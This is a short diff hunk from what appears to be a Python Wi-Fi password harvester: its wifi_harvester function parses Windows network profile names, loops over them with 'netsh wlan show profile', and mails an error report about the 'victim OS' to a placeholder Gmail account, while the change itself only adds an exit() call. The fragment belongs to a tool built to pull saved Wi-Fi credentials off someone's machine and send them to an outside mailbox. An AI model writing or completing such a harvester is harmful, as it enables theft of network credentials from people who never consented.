@@ -31,6 +31,7 @@ def wifi_harvester():
         net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
     except:
         mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxx@gmail.com", "[-] ERROR, Unsupported encoding in victim OS")
+        exit()
     result = {}
     for wifi in net_names:
         cmd = "netsh wlan show profile " + wifi
